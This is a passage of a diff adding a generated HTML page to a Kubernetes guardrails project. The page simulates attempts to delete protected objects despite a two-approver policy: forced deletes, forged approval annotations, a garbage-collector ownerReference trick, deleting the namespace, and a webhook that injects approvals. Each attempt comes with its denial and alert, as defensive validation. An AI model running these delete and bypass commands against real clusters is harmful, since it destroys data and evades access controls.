+<p>Even with <code>--dry-run=server</code>, the write is evaluated as an ordinary user: an impersonated session does not carry the OAuth marker in <code>userInfo.extra</code>, so <code>isApprover</code> is false and V3 denies it. Nobody may impersonate <code>userextras</code>, so the marker cannot be forged (docs/17). Both <code>ImpersonationUsed</code> and <code>ImpersonatedWriteDenied</code> fire.</p>
+<h2>A14 — force, cascade, collection and replace</h2>
+<pre><code class="language-bash">$ as-admin -n guardrails-test delete configmap victim --force --grace-period=0
+→ Error from server (Forbidden): … GUARDRAIL DENIED: deleting critical configmaps guardrails-test/victim …
+
+$ as-admin -n guardrails-test delete configmap -l guardrails.example.com/critical=true
+→ Error from server (Forbidden): … GUARDRAIL DENIED: … (one denial per matched object)
+
+$ as-admin -n guardrails-test replace --force -f victim.yaml
+→ Error from server (Forbidden): … GUARDRAIL DENIED: deleting critical configmaps …   (--force replaces = delete + create)
+
+$ as-admin -n guardrails-test delete configmap victim --cascade=orphan --wait=false
+→ Error from server (Forbidden): … GUARDRAIL DENIED: deleting critical configmaps …
+</code></pre>
+<p>None of these are a different code path: every one of them is a DELETE admission request, and V1 sees them all.</p>
+<h2>A15 — let the garbage collector do it</h2>
+<pre><code class="language-bash">$ as-admin -n guardrails-test patch configmap victim --type merge \
+    -p &#39;{&quot;metadata&quot;:{&quot;ownerReferences&quot;:[{&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;ConfigMap&quot;,&quot;name&quot;:&quot;disposable&quot;,&quot;uid&quot;:&quot;…&quot;}]}}&#39;
+→ configmap/victim patched          # allowed in phase 3 unless the object is in the self-protection set
+$ as-admin -n guardrails-test delete configmap disposable
+→ configmap &quot;disposable&quot; deleted
+</code></pre>
+<p>The garbage collector now tries to delete <code>victim</code> and is refused, because it is not an exempt identity:</p>
+<pre><code class="language-text">$ oc -n guardrails-test get cm victim
+NAME     DATA   AGE
+victim   1      2h                # still there
+
+audit: verb=delete user=system:serviceaccount:kube-system:generic-garbage-collector responseStatus=403
+       decision=&quot;op=DELETE … approved=false exempt=false&quot;
+</code></pre>
+<p>The repeated denials raise <code>CriticalResourceDeleteDenied</code> naming the garbage collector, which is the signal that someone tried this. In phase 4 the ownerReference edit itself is denied, and for the self-protection set it is denied in every phase.</p>
+<p><a id="a9"></a></p>
+<h2>A16 — delete the whole namespace instead</h2>
+<pre><code class="language-bash">$ as-admin delete namespace guardrails-test
+→ namespace &quot;guardrails-test&quot; deleted        # the namespace itself is not critical
+$ oc get ns guardrails-test
+NAME              STATUS        AGE
+guardrails-test   Terminating   3h
+</code></pre>
+<p>The namespace controller must delete the contents, and its deletes of the critical object are refused, so the namespace stays <code>Terminating</code> and the object survives. This is safe but messy, so <strong><code>NamespaceStuckTerminating</code></strong> now fires after 20 minutes (gap <strong>G13</strong>) and points at <code>list-pending-deletions.sh</code>. The cure is to finish the object through the workflow (or remove the label through Git); the namespace then completes on its own. The platform namespaces (<code>openshift-gitops</code>, <code>guardrails-system</code>, …) are critical by name, so this step is already refused for them.</p>
+<h2>A17 — install a mutating webhook that adds approvals</h2>
+<p>A mutating webhook runs <strong>before</strong> the policies, so it can add annotations to an object in flight. It gains nothing: the policies compare the incoming object against the stored one, and the injected entries do not name the caller, so V3 denies the write, whoever triggered it.</p>
+<pre><code class="language-text">$ as-dev -n guardrails-test annotate configmap victim foo=bar        # webhook injects two approvals
+→ Error from server (Forbidden): … GUARDRAIL DENIED: invalid change to guardrails.example.com/delete-approvals by dev@example.com …
+</code></pre>
+<p>Creating the webhook configuration is itself reported now: <strong><code>AdmissionWebhookConfigurationChanged</code></strong> (critical, security).</p>
+<h2>A18 — use a service account you control as the approver</h2>
+<p>Adding a service account to the approver group is denied (A3). Even if its name were in the group, <code>isApprover</code> also requires the <strong>human</strong> OAuth marker, which a service-account token never carries, so the approval is denied. Minting a token for a privileged service account raises <code>PrivilegedTokenMinted</code>, and using the break-glass identity raises <code>BreakGlassUsed</code> (P1) and is reviewed afterwards.</p>
+<h2>A19 — simply wait</h2>
+<p>An approval is valid for 4 hours and a request for 24. Collecting one approval today and a second tomorrow does not work: the reaper removes the first one and tells the approvers. Stopping the reaper to prevent that is denied (A10) and alerted (<code>GuardrailReaperNotRunning</code>).</p>
+<h2>A20 — the phase-1 and phase-2 caveat</h2>
+<p>Everything above assumes phase 3. In phases 1 and 2 the same evaluation runs, but the bindings only record or warn, so these commands <strong>succeed</strong> and are recorded instead:</p>
+<pre><code class="language-text">$ as-admin -n guardrails-test annotate configmap victim --overwrite &quot;guardrails.example.com/delete-approvals=a1@example.com|$(ts),a2@example.com|$(ts)&quot;
+Warning: Validation failed for ValidatingAdmissionPolicy &#39;guardrails-critical-delete&#39; with binding
+&#39;guardrails-critical-delete-labelled&#39;: GUARDRAIL DENIED: invalid change …          (phase 2 prints this; phase 1 is silent)
+configmap/victim annotated
+</code></pre>
+<p>with <code>CriticalDeleteWouldBeDenied</code> as the rollout signal. This is deliberate: the first two phases exist to find legitimate workflows that would break. The exception is the self-protection set (A3, A10, A11), which is Deny from day one.</p>
+<hr>
+<h1>Part C · The state table</h1>
+<p>The complete life of the annotations in Part A, and what each state means to the policy:</p>
+<table>
+<thead>
+<tr>
+<th>After step</th>
+<th><code>delete-request</code></th>
+<th><code>delete-requested-by</code></th>
+<th><code>delete-requested-at</code></th>
+<th><code>delete-approvals</code></th>
+<th><code>have/need</code></th>
+<th>DELETE allowed for</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>–</td>
+<td>–</td>
+<td>–</td>
+<td>–</td>
+<td>0/2</td>
+<td>nobody (except GitOps path / break-glass)</td>
+</tr>
+<tr>
+<td>2 request</td>
+<td><code>CHG0012345: …</code></td>
+<td><code>req@example.com</code></td>
+<td><code>2026-09-19T08:00:00Z</code></td>
+<td>–</td>
+<td>0/2</td>
+<td>nobody</td>
+</tr>
+<tr>
+<td>4 approval 1</td>
+<td>unchanged</td>
+<td>unchanged</td>
+<td>unchanged</td>
+<td><code>a1@…|08:05:12Z</code></td>
+<td>1/2</td>
+<td>nobody</td>
+</tr>
+<tr>
+<td>6 approval 2</td>
+<td>unchanged</td>
+<td>unchanged</td>
+<td>unchanged</td>
+<td><code>a1@…|08:05:12Z,a2@…|09:40:03Z</code></td>
+<td>2/2</td>
+<td>anyone with delete rights <strong>except</strong> <code>a1</code>, <code>a2</code></td>
+</tr>
+<tr>
+<td>8 executed</td>
+<td>object gone</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>–</td>
+</tr>
+<tr>
+<td>reaper after 4 h</td>
+<td>unchanged</td>
+<td>unchanged</td>
+<td>unchanged</td>
+<td>entries older than 4 h removed</td>
+<td>back to 1/2 or 0/2</td>
+<td>nobody</td>
+</tr>
+<tr>
+<td>reaper after 24 h</td>
+<td>cleared</td>
+<td>cleared</td>
+<td>cleared</td>
+<td>cleared</td>
+<td>0/2</td>
+<td>nobody</td>
+</tr>
+</tbody></table>
+<hr>
+<h1>Part D · Why forging is impossible, not merely blocked</h1>
+<table>
+<thead>
+<tr>
+<th>Claim</th>
+<th>Mechanism</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>An approval cannot be written on behalf of someone else</td>
+<td>V3 compares the appended entry to <code>request.userInfo.username</code>, which the <strong>API server</strong> fills in from the authenticated credential. It is not part of the request body and no client flag changes it.</td>
+</tr>
+<tr>
+<td>An admin cannot collect both approvals</td>
+<td>Only one entry may be added per write, it must name the caller, and the caller must not already appear in the list (compared case-insensitively).</td>
+</tr>
+<tr>
+<td>An admin cannot give themselves the approver role</td>
+<td><code>isApprover</code> reads <code>request.userInfo.groups</code>, filled from the IdP identity. Editing the group object is denied in every phase and needs a two-reviewer PR.</td>
+</tr>
+<tr>
+<td>An admin cannot pretend to be an approver with <code>--as</code></td>
+<td>RBAC grants nobody <code>impersonate</code> on <code>userextras</code>, so an impersonated session lacks the OAuth marker; impersonated writes are denied unless <code>--dry-run=server</code>, and exemptions and approver status are ignored for them.</td>
+</tr>
+<tr>
+<td>An admin cannot weaken the rule</td>
+<td><code>GuardrailConfig</code>, the policies and their bindings, the approver groups, the reaper CronJob and the Argo CD objects that select the phase are all Deny-in-every-phase for humans; Git requires two reviewers and CI refuses weakening.</td>
+</tr>
+<tr>
+<td>An admin cannot remove the protection from the object</td>
+<td>V2 (label) and the <code>objectSelector</code> that matches the old object.</td>
+</tr>
+<tr>
+<td>An admin cannot route around admission</td>
+<td>Every path (<code>--force</code>, <code>--cascade</code>, <code>deletecollection</code>, <code>replace --force</code>, the garbage collector, the namespace controller, a mutating webhook, a new Argo CD Application) ends in an admission request for that object, or in an identity that is not exempt.</td>
+</tr>
+<tr>
+<td>A stale approval cannot be reused</td>
+<td><code>approvalTTL</code> 4 h and <code>requestTTL</code> 24 h, enforced by the reaper, whose own identity may only remove entries; stopping it is denied and alerted.</td>
+</tr>
+<tr>
+<td>Nothing is silent</td>
+<td>Every step and every refusal is in the audit trail with the actor, and the alerts in docs/19 §6.2 cover request, approval, expiry, closure, denial and deletion.</td>
+</tr>
+</tbody></table>
+<p><strong>What is still true and must be accepted</strong> (residual, <code>docs/01</code>): the <code>system:masters</code> installer certificate bypasses RBAC and could forge the markers — it is vaulted under dual control and alerted; node or etcd access is below admission; three colluding people (a requester and two approvers) can legitimately delete anything; and in phases 1 and 2 nothing is blocked by design.</p>
+<hr>
+<h1>Part E · Gaps this simulation exposed, and their fixes</h1>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Severity</th>
+<th>Gap</th>
+<th>Fix</th>
+<th>Where</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>G9</td>
+<td><strong>Critical</strong></td>
+<td>Each overlay renders the guardrails Application pointing at itself, and the hardened binding did not cover Argo CD objects. One <code>oc patch</code> of <code>spec.source.path</code> moved the cluster back to phase 1 <strong>permanently</strong>, applied by the exempt Argo CD controller, with only an audit-level signal.</td>
+<td>critical <code>applications</code>, <code>applicationsets</code>, <code>appprojects</code> and <code>argocds</code> added to the always-Deny <code>-hardened</code> binding; CI invariant requires it</td>
+<td><code>vap-gitops-only-mutation.yaml</code>, <code>policy-ci.yaml</code>, automated §4</td>
+</tr>
+<tr>
+<td>G10</td>
+<td>Medium</td>
+<td><code>payloadUnchanged</code> did not compare <code>stringData</code>, <code>secrets</code>, <code>imagePullSecrets</code> or <code>automountServiceAccountToken</code>, so an approval write could have carried such a change on a Secret or ServiceAccount</td>
+<td>the four fields added to both policies</td>
+<td><code>vap-critical-delete.yaml</code>, <code>vap-gitops-only-mutation.yaml</code></td>
+</tr>
+<tr>
+<td>G11</td>
+<td>Medium</td>
+<td>Approver identities were compared exactly, so two spellings of one identity (<code>a1@…</code>, <code>A1@…</code>) could count as two approvers</td>
+<td>distinctness, &quot;requester is not an approver&quot; and &quot;executor is not an approver&quot; compare lower-cased</td>
+<td><code>vap-critical-delete.yaml</code>, automated §6</td>
+</tr>
+<tr>
+<td>G12</td>
+<td>High</td>
+<td>Argo CD&#39;s stock <code>default</code> AppProject permits every repo, destination and kind: anyone who can create an Application could have the <strong>exempt</strong> controller apply arbitrary manifests</td>
+<td>a locked <code>default</code> AppProject (empty repos, destinations and whitelists), labelled critical so edits need Git; CI keeps it empty; new alert <code>ArgoCDApplicationWrittenOutOfBand</code></td>
+<td><code>appproject-default-locked.yaml</code>, <code>loki-alertingrules-audit.yaml</code>, <code>policy-ci.yaml</code></td>
+</tr>
+<tr>
+<td>G13</td>
+<td>Low</td>
+<td>A namespace holding a critical object stays <code>Terminating</code> forever with no alert; webhook configuration changes were not alerted</td>
+<td><code>NamespaceStuckTerminating</code> (20 min) and <code>AdmissionWebhookConfigurationChanged</code></td>
+<td><code>prometheusrule-gitops-health.yaml</code>, <code>loki-alertingrules-audit.yaml</code></td>
+</tr>
+</tbody></table>
+<p>Earlier rounds: <code>docs/19</code> §9 (D1, D2, G1–G8) and <code>docs/16</code> (the 59-finding review).</p>
+<hr>
+<h1>Part F · Running this simulation yourself</h1>
+<pre><code class="language-bash"># everything in Part A and most of Part B, asserted automatically, in a scratch namespace:
+scripts/test-guardrails.sh                 # 80 cases, phase-aware, evidence in evidence/&lt;timestamp&gt;.log
+
+# the same scenarios by hand, with expected output for sign-off:
+#   docs/14 §4 (forged approvals), §5 (happy path), §6 (cancel, expiry, status, notifications), §3/§8 (self-protection)
+
+# proof that the notifications arrived (keep for the audit file):
+#   Teams screenshots + the email headers, plus:
+scripts/audit-query.sh victim
+</code></pre>
+<p>Evidence to keep for a phase-3 go-live: the test log, the Loki query output from Step 9, the approvers&#39; notifications from Steps 2, 4 and 6, and the four denial messages from A1, A2, A10 and A11.</p>
+
+<hr><p class="lead" style="font-size:14px">All documents: <a href="readme.html">README</a> · <a href="00-placeholders.html">00 · placeholders</a> · <a href="01-threat-model.html">01 · threat-model</a> · <a href="02-audit-logging.html">02 · audit-logging</a> · <a href="03-identity-rbac-hardening.html">03 · identity-rbac-hardening</a> · <a href="04-deletion-guardrails.html">04 · deletion-guardrails</a> · <a href="05-argocd-protection.html">05 · argocd-protection</a> · <a href="06-alerting-and-notifications.html">06 · alerting-and-notifications</a> · <a href="07-backup-and-recovery.html">07 · backup-and-recovery</a> · <a href="08-github-approval-workflow.html">08 · github-approval-workflow</a> · <a href="09-runbooks.html">09 · runbooks</a> · <a href="10-rollout-plan.html">10 · rollout-plan</a> · <a href="11-testing-and-validation.html">11 · testing-and-validation</a> · <a href="12-operations-and-compliance.html">12 · operations-and-compliance</a> · <a href="13-solution-justification.html">13 · solution-justification</a> · <a href="14-manual-test-guide.html">14 · manual-test-guide</a> · <a href="15-implementation-guide.html">15 · implementation-guide</a> · <a href="16-production-readiness-review.html">16 · production-readiness-review</a> · <a href="17-impersonation-control.html">17 · impersonation-control</a> · <a href="18-the-story.html">18 · the-story</a> · <a href="19-deletion-approval-lifecycle.html">19 · deletion-approval-lifecycle</a> · <a href="20-deletion-simulation.html">20 · deletion-simulation</a></p>
+</main>
+<footer>Generated from <code>docs/20-deletion-simulation.md</code> by <code>scripts/build-html-docs.mjs</code>. The Markdown in the repository is the source of truth.</footer>
+<script type="module">import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';const dark=document.documentElement.getAttribute('data-theme')==='dark'||(!document.documentElement.getAttribute('data-theme')&&matchMedia('(prefers-color-scheme: dark)').matches);mermaid.initialize({startOnLoad:true,theme:dark?'dark':'default'});</script>
+</body></html>
